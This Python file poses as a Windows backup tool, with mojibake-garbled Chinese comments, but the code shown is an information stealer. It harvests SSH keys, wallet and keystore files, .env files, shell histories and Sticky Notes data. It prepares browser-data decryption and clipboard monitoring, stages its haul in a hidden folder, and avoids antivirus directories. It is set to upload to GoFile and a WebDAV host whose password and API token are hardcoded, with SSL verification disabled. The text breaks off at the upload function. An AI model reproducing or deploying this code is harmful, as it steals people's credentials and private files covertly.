# -*- coding: utf-8 -*-
"""
Windowsè‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½Windowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import requests
import pyperclip
import getpass
import json
import base64
import sqlite3
import urllib3
from datetime import datetime, timedelta
from functools import lru_cache
from requests.auth import HTTPBasicAuth

# ç¦ç”¨SSLè­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# å°è¯•å¯¼å…¥æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ‰€éœ€çš„åº“
BROWSER_EXPORT_AVAILABLE = False
try:
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    logging.warning("æµè§ˆå™¨æ•°æ®å¯¼å‡ºåŠŸèƒ½ä¸å¯ç”¨ï¼šç¼ºå°‘ pywin32 æˆ– pycryptodome åº“")

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    MAX_SERVER_RETRIES = 2  # æ¯ä¸ªæœåŠ¡å™¨æœ€å¤šå°è¯•æ¬¡æ•°
    FILE_DELAY_AFTER_UPLOAD = 1  # ä¸Šä¼ åç­‰å¾…æ–‡ä»¶é‡Šæ”¾çš„æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_DELETE_RETRY_COUNT = 3  # æ–‡ä»¶åˆ é™¤é‡è¯•æ¬¡æ•°
    FILE_DELETE_RETRY_DELAY = 2  # æ–‡ä»¶åˆ é™¤é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç½‘ç»œé…ç½®
    NETWORK_TIMEOUT = 3  # ç½‘ç»œæ£€æŸ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰
    CLIPBOARD_INTERVAL = 1200  # JTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰
    CLIPBOARD_CHECK_INTERVAL = 3  # JTBæ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTBä¸Šä¼ æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
    
    # é”™è¯¯å¤„ç†é…ç½®
    CLIPBOARD_ERROR_WAIT = 60  # JTBç›‘æ§è¿ç»­é”™è¯¯ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    BACKUP_CHECK_INTERVAL = 3600  # å¤‡ä»½æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼Œæ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡ï¼‰
    ERROR_RETRY_DELAY = 60  # å‘ç”Ÿé”™è¯¯æ—¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    MAIN_ERROR_RETRY_DELAY = 300  # ä¸»ç¨‹åºé”™è¯¯é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼Œ5åˆ†é’Ÿï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    SCAN_TIMEOUT = 600  # æ‰«æç›®å½•è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    FILE_RETRY_COUNT = 3  # æ–‡ä»¶è®¿é—®é‡è¯•æ¬¡æ•°
    FILE_RETRY_DELAY = 5  # æ–‡ä»¶é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    COPY_CHUNK_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶å—å¤§å°ï¼ˆ1MBï¼Œæé«˜æ€§èƒ½ï¼‰
    PROGRESS_INTERVAL = 10  # è¿›åº¦æ˜¾ç¤ºé—´éš”ï¼ˆç§’ï¼‰
    PROGRESS_LOG_INTERVAL = 10  # æ¯Nä¸ªæ–‡ä»¶è®°å½•ä¸€æ¬¡è¿›åº¦
    
    # ç£ç›˜ç©ºé—´æ£€æŸ¥
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # æœ€å°å¯ç”¨ç©ºé—´ï¼ˆ1GBï¼‰
    
    # å¤‡ä»½ç›®å½• - ç”¨æˆ·æ–‡æ¡£ç›®å½•
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\AutoBackup')
    
    # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£/ä»£ç ç±»
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".et", ".one", ".js", ".py", ".go", ".sh", ".ts", ".jsx", ".tsx", 
        ".bash", ".rs", ".csv", ".tsv", ".ps1", ".rtf", ".env", ".dat", ".md", ".pdf",
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".json", ".toml", ".conf",".wallet",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".yaml", ".yml", ".toml",
    ]
    
    # æŒ‡å®šè¦ç›´æ¥å¤åˆ¶çš„ç›®å½•å’Œæ–‡ä»¶ï¼ˆç›¸å¯¹äºç”¨æˆ·ä¸»ç›®å½• %USERPROFILE%ï¼‰
    WINDOWS_SPECIFIC_DIRS = [
        "Desktop",  # æ¡Œé¢ç›®å½•
        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite",  # ä¾¿ç­¾æ•°æ®åº“
        ".python_history",  # Python å†å²è®°å½•æ–‡ä»¶
        ".node_repl_history",  # Node.js REPL å†å²è®°å½•æ–‡ä»¶
        r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell å†å²
        r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core å†å²ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
    ]
    
    # æ’é™¤ç›®å½•é…ç½®
    EXCLUDE_INSTALL_DIRS = [       
        # æ¸¸æˆç›¸å…³ç›®å½•
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # å¸¸è§è½¯ä»¶å®‰è£…ç›®å½•
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # å¼€å‘å·¥å…·å’Œç¯å¢ƒ
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", 
        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap"
        "__pycache__", ".vscode-server", "dist", ".cache",
        
        # å…¶ä»–å¤§å‹åº”ç”¨
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # æµè§ˆå™¨ç›¸å…³ 
        "Google", "Chrome", "Brave", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # é€šè®¯å’ŒåŠå…¬è½¯ä»¶
        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
        
        # å¤šåª’ä½“è½¯ä»¶
        "Adobe", "Premiere", "Photoshop", "After Effects",
        "Vegas", "MAGIX", "Audacity",
        
        # å®‰å…¨è½¯ä»¶
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # ç³»ç»Ÿå·¥å…·
        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
    ]
    
    # å…³é”®è¯æ’é™¤
    EXCLUDE_KEYWORDS = [
        # è½¯ä»¶ç›¸å…³
        "program", "software", "install", "setup", "update",
        "patch", "cache", 
        
        # å¼€å‘ç›¸å…³
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "obj", "packages",
        
        # å¤šåª’ä½“ç›¸å…³
        "music", "video", "movie", "audio", "media", "stream",
        
        # æ¸¸æˆç›¸å…³
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # ä¸´æ—¶æ–‡ä»¶
        "log", "crash", "dumps", "report",
        
        # å…¶ä»–
        "bak", "obsolete", "archive", "trojan", "clash", "vpn", 
        "thumb", "thumbnail", "preview" , "v2ray", "user", "mail",

        # ä¸­æ–‡
        "ç«ç»’", "æ€æ¯’", "ç”µè„‘ç®¡å®¶",
    ]

    # GoFile ä¸Šä¼ é…ç½®ï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        
        # Infini Cloud é…ç½®
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"
        self.infini_pass = "my95gfPVtKuDCpAK"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wins_backup"
        
        # é…ç½® requests session ç”¨äºä¸Šä¼ 
        self.session = requests.Session()
        self.session.verify = False  # ç¦ç”¨SSLéªŒè¯
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API tokenï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        self.api_token = "8HSdvkTfGNDxlhQFShQkkmJK2Yh8zWPQ"
        
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # è‡ªå®šä¹‰æ—¥å¿—æ ¼å¼åŒ–å™¨
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                    if isinstance(record.msg, str):
                        msg = record.msg
                        # è·³è¿‡è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return None
                        # ä¿ç•™è¿›åº¦å’ŒçŠ¶æ€ä¿¡æ¯
                        if any(x in msg for x in ["å·²å¤‡ä»½", "å®Œæˆ", "å¤±è´¥", "é”™è¯¯", "æˆåŠŸ", "ğŸ“", "âœ…", "âŒ", "â³", "ğŸ“‹"]):
                            return super().format(record)
                        # å…¶ä»–æ™®é€šæ—¥å¿—
                        return super().format(record)
                    return super().format(record)
            
            # è‡ªå®šä¹‰è¿‡æ»¤å™¨
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # è¿‡æ»¤æ‰è·¯å¾„ç›¸å…³çš„æ—¥å¿—
                        if any(x in record.msg for x in ["æ£€æŸ¥ç›®å½•:", "æ’é™¤ç›®å½•:", ":\\", "/"]):
                            return False
                    return True
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except (OSError, IOError, PermissionError) as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"ç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"è¿æ¥ {host}:{port} å¤±è´¥: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """å®‰å…¨åˆ é™¤æ–‡ä»¶ï¼Œæ”¯æŒé‡è¯•æœºåˆ¶
        
        Args:
            file_path: è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„
            retry: æ˜¯å¦ä½¿ç”¨é‡è¯•æœºåˆ¶
            
        Returns:
            bool: åˆ é™¤æ˜¯å¦æˆåŠŸ
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # ä½¿ç”¨é‡è¯•æœºåˆ¶åˆ é™¤æ–‡ä»¶
        try:
            # ç­‰å¾…æ–‡ä»¶å¥æŸ„å®Œå…¨é‡Šæ”¾
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"åˆ é™¤æ–‡ä»¶é‡è¯•ä¸­: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"åˆ é™¤æ–‡ä»¶å¤±è´¥: {str(e)}")
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # ä¼˜å…ˆæ£€æŸ¥æ˜¯å¦æ˜¯äº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        
        # æ£€æŸ¥è·¯å¾„ä¸­çš„æ¯ä¸ªéƒ¨åˆ†
        for part in path_parts:
            part_lower = part.lower()
            # å¦‚æœä»»ä½•éƒ¨åˆ†åŒ…å«äº‘ç›˜å…³é”®è¯ï¼Œåˆ™ä¸æ’é™¤è¯¥ç›®å½•
            if any(keyword.lower() in part_lower for keyword in cloud_keywords):
                return False
        
        # æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        for ex in self.config.EXCLUDE_INSTALL_DIRS:
            ex_lower = ex.lower()
            ex_parts = set(ex_lower.split())
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†
                part_normalized = set(part.replace('_', ' ').replace('-', ' ').lower().split())
                
                # åªæœ‰å½“æ’é™¤ç›®å½•åå®Œå…¨åŒ¹é…æ—¶æ‰æ’é™¤
                if ex_parts == part_normalized:
                    return True
        
        # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ›´æ™ºèƒ½çš„åŒ¹é…
        for keyword in self.config.EXCLUDE_KEYWORDS:
            keyword_lower = keyword.lower()
            
            # æ£€æŸ¥æ¯ä¸ªè·¯å¾„éƒ¨åˆ†
            for part in path_parts:
                # 1. æ ‡å‡†åŒ–è·¯å¾„éƒ¨åˆ†ï¼Œç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦
                normalized_part = (part.replace('_', ' ')
                                    .replace('-', ' ')
                                    .replace('.', ' ')
                                    .replace('cache', ' cache')  # ç‰¹æ®Šå¤„ç†cacheå…³é”®è¯
                                    .lower())
                
                # 2. åˆ†å‰²æˆå•è¯
                word_parts = set(normalized_part.split())
                
                # 3. æ ‡å‡†åŒ–å…³é”®è¯
                normalized_keyword = keyword_lower.replace('_', ' ').replace('-', ' ')
                keyword_parts = set(normalized_keyword.split())
                
                # 4. æ£€æŸ¥å„ç§åŒ¹é…æƒ…å†µ
                if any([
                    keyword_lower in normalized_part.replace(' ', ''),  # ç›´æ¥åŒ…å«
                    keyword_lower in word_parts,  # ä½œä¸ºç‹¬ç«‹å•è¯å­˜åœ¨
                    all(kp in normalized_part.replace(' ', '') for kp in keyword_parts)  # æ‰€æœ‰å…³é”®è¯éƒ¨åˆ†éƒ½å­˜åœ¨
                ]):
                    return True
    
        return False

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windowsç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½ç›®å½•:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")
            logging.debug(f"æ‰©å±•åç±»å‹: {extensions_type}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
        
        if self.config.DEBUG_MODE:
            logging.debug(f"ä½¿ç”¨çš„æ–‡ä»¶æ‰©å±•å: {extensions}")
                     
        files_count = 0
        total_size = 0
        start_time = time.time()
        last_progress_time = start_time
        scanned_dirs = 0    # å·²æ‰«æç›®å½•æ•°
        excluded_dirs = 0   # å·²æ’é™¤ç›®å½•æ•°

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                scanned_dirs += 1
                
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > self.config.SCAN_TIMEOUT:
                    logging.error(f"âŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # å®šæœŸæ˜¾ç¤ºè¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"â³ å·²æ‰«æ {scanned_dirs} ä¸ªç›®å½•ï¼Œæ’é™¤ {excluded_dirs} ä¸ªç›®å½•")
                        logging.debug(f"â³ å½“å‰æ‰«æ: {root}")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # è·³è¿‡æ’é™¤çš„ç›®å½•
                if self.should_exclude_dir(root):
                    excluded_dirs += 1
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æ’é™¤ç›®å½•: {root}")
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    file_lower = file.lower()
                    # æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
                    if not any(file_lower.endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡ç©ºæ–‡ä»¶: {source_file}")
                            continue
                        if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"è·³è¿‡å¤§æ–‡ä»¶: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
                            continue
                    except OSError as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥: {source_file} - {str(e)}")
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(self.config.FILE_RETRY_COUNT):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError) as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"æ–‡ä»¶è®¿é—®å¤±è´¥: {source_file} - {str(e)}")
                                if attempt < self.config.FILE_RETRY_COUNT - 1:
                                    time.sleep(self.config.FILE_RETRY_DELAY)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"åˆ›å»ºç›®æ ‡å­ç›®å½•å¤±è´¥: {target_sub_dir}")
                                break
                                
                            # ä½¿ç”¨ä¼˜åŒ–çš„åˆ†å—å¤åˆ¶ï¼ˆ1MBå—å¤§å°ï¼‰
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                while True:
                                    chunk = src.read(self.config.COPY_CHUNK_SIZE)
                                    if not chunk:
                                        break
                                    dst.write(chunk)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            if self.config.DEBUG_MODE:
                                if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
                                    logging.debug(f"ğŸ“ å·²å¤‡ä»½ {files_count} ä¸ªæ–‡ä»¶ ({total_size / 1024 / 1024:.1f}MB)")
                                logging.debug(f"æˆåŠŸå¤åˆ¶: {source_file} -> {target_file}")
                            
                            break  # æˆåŠŸåè·³å‡ºé‡è¯•å¾ªç¯
                            
                        except (PermissionError, OSError, IOError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"âŒ æ–‡ä»¶å¤åˆ¶å¤±è´¥: {source_file} - {str(e)}")
                        except (MemoryError, RuntimeError) as e:
                            if attempt == self.config.FILE_RETRY_COUNT - 1:
                                logging.error(f"âŒ æ–‡ä»¶å¤åˆ¶å‡ºç°ç³»ç»Ÿé”™è¯¯: {source_file} - {str(e)}")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {str(e)}")
        except (MemoryError, RuntimeError) as e:
            logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºç°ç³»ç»Ÿé”™è¯¯: {str(e)}")

        # æ˜¾ç¤ºæœ€ç»ˆç»Ÿè®¡ä¿¡æ¯
        if files_count > 0:
            logging.info(f"\nğŸ“Š å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            if self.config.DEBUG_MODE:
                logging.debug(f"   ğŸ“‚ æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"   ğŸš« æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
            return target_dir
        else:
            if self.config.DEBUG_MODE:
                logging.debug(f"æ‰«æç»Ÿè®¡:")
                logging.debug(f"- æ‰«æç›®å½•æ•°: {scanned_dirs}")
                logging.debug(f"- æ’é™¤ç›®å½•æ•°: {excluded_dirs}")
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æ–‡ä»¶")
            return None
    
    def _get_upload_server(self):
        """è·å–ä¸Šä¼ æœåŠ¡å™¨åœ°å€
    
        Returns:
